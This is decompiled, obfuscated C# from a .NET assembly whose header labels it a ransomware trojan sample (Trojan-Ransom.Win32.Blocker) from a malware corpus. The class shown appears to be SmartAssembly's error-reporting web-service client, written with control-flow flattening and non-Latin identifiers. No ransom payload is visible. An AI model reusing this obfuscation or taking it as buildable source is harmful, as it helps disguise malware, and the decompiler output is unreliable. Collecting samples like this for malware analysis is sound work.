// Decompiled with JetBrains decompiler
// Type: Ⴈ.ႷႣ
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsCore.UI;
using System;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Threading;
using System.Web.Services;
using System.Web.Services.Protocols;

namespace Ⴈ
{
  [WebServiceBinding(Name = "LoginServiceSoap", Namespace = "http://www.smartassembly.com/webservices/UploadReportLogin/")]
  internal sealed class ႷႣ : SoapHttpClientProtocol
  {
    public ႷႣ()
    {
      try
      {
        try
        {
          string ⴓ = ႳႥ.Ⴓ;
          SmartAssembly.SmartExceptionsCore.Win32.ႣႳ((WebClientProtocol) this, ႷႭ.ႰႨ(ႳႥ.Ⴓ, Ⴈ.Ⴀ.Ⴐ(1468304006, 5), 403, 417), 724, 754);
          this.Timeout = 30000;
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException1(ex, (object) this);
          throw;
        }
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException1(ex, (object) this);
        throw;
      }
    }

    [SoapDocumentMethod("http://www.smartassembly.com/webservices/UploadReportLogin/GetServerURL")]
    public string Ⴗ(string Ⴍ)
    {
      object[] objArray;
      try
      {
        string str;
        try
        {
          string methodName = ႳႷ.Ⴗ(2059790955, 5);
          objArray = new object[1]{ (object) Ⴍ };
          object[] parameters = objArray;
          str = (string) this.Invoke(methodName, parameters)[0];
        }
        catch (Exception ex)
        {
          object[] o1 = objArray;
          string o3 = Ⴍ;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) this, (object) o3);
          throw;
        }
        return str;
      }
      catch (Exception ex)
      {
        object[] o1 = objArray;
        string str;
        string o2 = str;
        string o4 = Ⴍ;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) this, (object) o4);
        throw;
      }
    }

    protected override WebRequest GetWebRequest(Uri Ⴅ)
    {
      int num;
      WebRequest webRequest1;
      HttpWebRequest httpWebRequest;
      try
      {
        WebRequest webRequest2;
        try
        {
          num = 5;
          while (true)
          {
            switch (num)
            {
              case 0:
                httpWebRequest = webRequest1 as HttpWebRequest;
                goto case 1;
              case 1:
                num = httpWebRequest == null ? 4 : 2;
                continue;
              case 2:
                goto label_5;
              case 3:
                goto label_8;
              case 4:
                goto label_6;
              default:
                webRequest1 = base.GetWebRequest(Ⴅ);
                goto case 0;
            }
          }
label_5:
          HeaderControl.Ⴐ(ႷႭ.ႰႷ(httpWebRequest, 121, 14), false, 389, 386);
label_6:
          webRequest2 = webRequest1;
        }
        catch (Exception ex)
        {
          WebRequest o1 = webRequest1;
          HttpWebRequest o2 = httpWebRequest;
          Uri o4 = Ⴅ;
          StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) this, (object) o4);
          throw;
        }
label_8:
        return webRequest2;
      }
      catch (Exception ex)
      {
        WebRequest o1 = webRequest1;
        HttpWebRequest o2 = httpWebRequest;
        WebRequest webRequest3;
        WebRequest o3 = webRequest3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) num;
        Uri o6 = Ⴅ;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) this, (object) o6);
        throw;
      }
    }

    static ႷႣ()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static string Ⴐ([In] ResourceManager obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 73:
            num2 = 3;
            break;
          default:
            num2 = 2;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
              goto label_8;
            case 2:
              num1 = 6;
              continue;
            case 4:
            case 7:
              num1 = 6;
              continue;
            case 6:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.Ⴐ);
              num1 = 6;
              continue;
          }
        }
label_8:
        return obj0.GetString(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        ResourceManager o2 = obj0;
        string o3 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static void Ⴅ([In] Thread obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
        num1 = 3;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_8;
            case 1:
            case 2:
            case 5:
              num1 = 3;
              continue;
            case 4:
              goto label_7;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 31:
                  num2 = 4;
                  break;
                default:
                  num2 = 2;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.IsBackground = obj1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        Thread o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<bool> o4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj3;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    internal static bool Ⴀ([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 24:
            num2 = 7;
            break;
          default:
            num2 = 0;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = 5;
              continue;
            case 1:
            case 4:
              num1 = 5;
              continue;
            case 5:
              goto label_3;
            case 6:
            case 7:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.Ⴀ);
              num1 = 5;
              continue;
          }
        }
label_8:
        return object.ReferenceEquals(obj0, obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        object o2 = obj0;
        object o3 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, o2, o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static bool Ⴃ([In] FieldInfo obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 18:
            num2 = 7;
            break;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = 1;
              continue;
            case 1:
            case 2:
              goto label_3;
            case 4:
              num1 = 1;
              continue;
            case 5:
            case 6:
            case 7:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.Ⴃ);
              num1 = 1;
              continue;
          }
        }
label_8:
        return obj0.IsLiteral;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        FieldInfo o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }
  }
}
